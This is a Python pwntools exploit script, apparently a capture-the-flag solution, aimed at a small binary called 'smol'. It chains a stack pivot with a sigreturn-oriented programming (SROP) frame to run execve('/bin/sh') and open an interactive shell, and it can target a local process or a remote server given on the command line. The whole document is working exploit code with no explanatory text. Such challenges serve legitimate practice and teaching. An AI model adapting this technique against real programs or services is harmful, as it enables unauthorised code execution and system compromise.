from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main+21
continue
'''.format(**locals())

exe = './challenge/smol'
elf = context.binary = ELF(exe, checksec=False)
p = start()

syscall = 0x000000000040100a
pos = 0x402200                         # position of b'/bin/sh\x00'
read = 0x0000000000401015
ret = 0x401043

# execve(pos, 0, 0)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = pos
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall


# stack pivot
new_rbp = pos + 0x18
new_rsp = new_rbp - 0x10

p.send(flat(
    cyclic(8),
    new_rsp,
    read
))
sleep(1)

p.send(flat(
    b'/bin/sh\x00',       # pos 
    new_rbp,                
    read,
    syscall,              # rsp = rbp = pos + 0x18
    frame
))
sleep(1)

p.send(p64(ret) + p32(syscall) + b'\x00'*3) # set rax = 0xf
p.interactive()
